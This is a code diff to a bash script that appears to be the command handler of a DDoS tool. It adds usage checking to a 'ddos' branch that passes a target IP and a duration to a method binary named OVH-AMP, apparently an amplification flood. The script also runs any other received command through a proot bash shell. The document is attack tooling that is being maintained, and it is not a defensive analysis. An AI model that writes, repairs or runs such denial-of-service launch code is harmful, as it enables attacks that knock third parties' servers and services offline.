@@ -54,10 +54,13 @@ if [[ -f "./installed" ]]; then
         fi
         
         if [ "$cmdtorun" == "ddos" ]; then
+            if [ ${#cmdtorun[@]} -lt 3 ]; then
+                echo "Usage: ddos <target_ip> <duration>"
+                exit 1
+            fi
             target_ip=${cmdtorun[1]}
             duration=${cmdtorun[2]}
             ~/root/methods/OVH-AMP "$target_ip" "$duration"
-            echo("$target_ip $duration")
         fi
         
         ./libraries/proot -S . /bin/bash -c "$cmdtorun"
